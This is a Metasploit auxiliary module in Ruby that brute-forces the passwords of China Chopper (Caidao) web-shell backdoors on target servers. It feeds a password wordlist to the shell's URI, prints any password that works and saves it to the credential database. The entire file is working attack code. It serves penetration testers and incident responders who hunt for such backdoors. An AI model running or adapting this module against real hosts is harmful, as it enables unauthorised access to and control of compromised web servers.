##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/caidao'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Chinese Caidao Backdoor Bruteforce',
      'Description'    => 'This module attempts to bruteforce chinese caidao asp/php/aspx backdoor.',
      'Author'         => [ 'Nixawk' ],
      'References'     => [
        ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'],
        ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html'],
        ['URL', 'https://www.exploit-db.com/docs/27654.pdf'],
        ['URL', 'https://www.us-cert.gov/ncas/alerts/TA15-313A'],
        ['URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
      ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URL that handles the login process', '/caidao.php']),
        OptPath.new('PASS_FILE', [
          false,
          'The file that contains a list of of probable passwords.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
        ])
      ])

    # caidao does not have an username, there's only password
    deregister_options('HttpUsername', 'HttpPassword', 'USERNAME', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'DB_ALL_USERS', 'PASSWORD_SPRAY')
  end

  def scanner(ip)
    @scanner ||= lambda {
      cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file:       datastore['PASS_FILE'],
        password:        datastore['PASSWORD'],
        # The LoginScanner API refuses to run if there's no username, so we give it a fake one.
        # But we will not be reporting this to the database.
        username:        'caidao'
      )

      return Metasploit::Framework::LoginScanner::Caidao.new(
        configure_http_login_scanner(
          host: ip,
          port: datastore['RPORT'],
          uri: datastore['TARGETURI'],
          cred_details:       cred_collection,
          stop_on_success:    datastore['STOP_ON_SUCCESS'],
          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
          connection_timeout: 5,
          http_username: datastore['HttpUsername'],
          http_password: datastore['HttpPassword']
        ))
    }.call
  end

  def report_good_cred(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: result.status,
      proof: result.proof
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def report_bad_cred(ip, rport, result)
    invalidate_login(
      address: ip,
      port: rport,
      protocol: 'tcp',
      private: result.credential.private,
      realm_key: result.credential.realm_key,
      realm_value: result.credential.realm,
      status: result.status,
      proof: result.proof
    )
  end

  # Attempts to login
  def bruteforce(ip)
    scanner(ip).scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential.private}'")
        report_good_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)
        report_bad_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential.private}'")
        report_bad_cred(ip, rport, result)
      end
    end
  end

  def run_host(ip)
    unless scanner(ip).check_setup
      print_brute(:level => :error, :ip => ip, :msg => 'Backdoor type is not support')
      return
    end

    bruteforce(ip)
  end
end
